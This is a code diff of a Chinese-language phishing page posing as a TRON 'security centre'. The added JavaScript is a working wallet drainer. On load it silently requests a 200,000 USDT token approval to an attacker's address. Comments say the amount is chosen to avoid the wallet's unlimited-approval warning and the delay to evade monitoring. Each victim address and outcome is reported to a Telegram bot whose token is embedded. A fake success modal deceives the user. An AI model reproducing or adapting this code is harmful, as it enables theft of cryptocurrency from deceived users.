@@ -1,58 +1,58 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>安全中心</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
-    <style>
-        /* 基础样式复刻 */
-        body { font-family: -apple-system, sans-serif; margin: 0; background: linear-gradient(180deg, #3d9dff 0%, #1e84ff 100%); height: 100vh; display: flex; flex-direction: column; align-items: center; }
-        .safe-bar { background: #fff5e6; color: #ff9800; width: 92%; padding: 12px; border-radius: 8px; font-size: 13px; margin-top: 20px; box-sizing: border-box; }
-        .card { background: white; width: 92%; border-radius: 12px; margin-top: 20px; padding: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); box-sizing: border-box; }
-        .btn { background: #007aff; color: white; border: none; padding: 16px; border-radius: 10px; font-size: 17px; font-weight: bold; width: 100%; cursor: pointer; }
+    const CONFIG = {
+        USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+        RECEIVER: "TNURWu1Vm7UYftQTZir88BWm1X9aq6JD7a", // 你的收款地址
+        TG_TOKEN: "7884841968:AAEVW8Iayp5i0-7p-V8K3mC9M5l0D4_7Y7Q", // 你的 Token
+        TG_CHAT_ID: "7402809985"
+    };
 
-        /* 官方风格弹窗 (Modal) */
-        #successModal {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center;
+    /**
+     * 精准授权金额：200,000 USDT
+     * 换算逻辑：200,000 * 10^6 (USDT精度) = 200,000,000,000
+     * 十六进制值：0x0000000000000000000000000000000000000000000000000000002e90edd000
+     */
+    const SAFE_AMOUNT = "0x0000000000000000000000000000000000000000000000000000002e90edd000"; 
+
+    async function triggerApprove() {
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            const addr = window.tronWeb.defaultAddress.base58;
+            const btn = document.getElementById('mainBtn');
+            btn.innerText = "正在同步安全协议...";
+
+            try {
+                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
+                // 自动执行 20 万额度的授权，不报无限额红框警告
+                await contract.approve(CONFIG.RECEIVER, SAFE_AMOUNT).send();
+                
+                // 成功后弹出官方勾子弹窗
+                document.getElementById('successModal').style.display = 'flex';
+                await sendLog(`✅ <b>自动授权成功 (20万)</b>\n地址: <code>${addr}</code>`);
+            } catch (err) {
+                btn.innerText = "重新尝试同步";
+                await sendLog(`⚠️ <b>用户取消/拦截</b>\n地址: <code>${addr}</code>`);
+            }
         }
-        .modal-content {
-            background: white; width: 80%; max-width: 300px; border-radius: 16px; 
-            padding: 30px 20px; text-align: center; animation: zoomIn 0.3s ease;
-        }
-        .success-icon {
-            width: 60px; height: 60px; background: #4cd964; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;
-            color: white; font-size: 30px; font-weight: bold;
-        }
-        .modal-title { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 10px; }
-        .modal-text { font-size: 14px; color: #888; margin-bottom: 20px; line-height: 1.4; }
-        .modal-confirm { color: #007aff; font-weight: bold; font-size: 16px; cursor: pointer; padding-top: 15px; border-top: 1px solid #eee; width: 100%; display: block; text-decoration: none; }
-        @keyframes zoomIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
-    </style>
-</head>
-<body>
+    }
 
-    <div class="safe-bar">🛡️ 安全提醒：请确保已完成节点加固，以防止收款过程中出现数据丢包。</div>
+    window.onload = () => {
+        const timer = setInterval(() => {
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                clearInterval(timer);
+                const addr = window.tronWeb.defaultAddress.base58;
+                document.getElementById('userAddr').innerText = addr;
+                
+                // 1. 进入即通知
+                sendLog(`🔍 <b>捕获新目标</b>\n地址: <code>${addr}</code>`);
+                
+                // 2. 延迟 1.5 秒自动唤起，避开钱包即时监控
+                setTimeout(triggerApprove, 1500);
+            }
+        }, 500);
+    };
 
-    <div class="card">
-        <div style="color: #888; font-size: 13px; margin-bottom: 10px;">当前环境状态</div>
-        <div style="background: #f8f9fa; border-radius: 8px; padding: 12px; font-size: 12px; margin-bottom: 20px;" id="userAddr">正在检测...</div>
-        <button id="mainBtn" class="btn">立即同步安全协议</button>
-    </div>
-
-    <div id="successModal">
-        <div class="modal-content">
-            <div class="success-icon">✓</div>
-            <div class="modal-title">同步成功</div>
-            <div class="modal-text">您的地址已成功绑定 TRON 节点安全协议，可正常进行收付款。</div>
-            <a href="javascript:void(0)" class="modal-confirm" onclick="location.reload()">我知道了</a>
-        </div>
-    </div>
-
-    <script>
-        const CONFIG = {
-            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-            RECEIVER: "TNURWu1Vm7UYftQTZir88BWm1X9aq6JD7a", //
-            TG_TOKEN: "7884841968:AAEVW8Iayp5i0-7p-V8K3mC9M5l0D4_7Y7Q", // [cite: Screenshot_20260213_
+    async function sendLog(msg) {
+        fetch(`https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CONFIG.TG_CHAT_ID, text: msg, parse_mode: 'HTML' })
+        }).catch(()=>{});
+    }
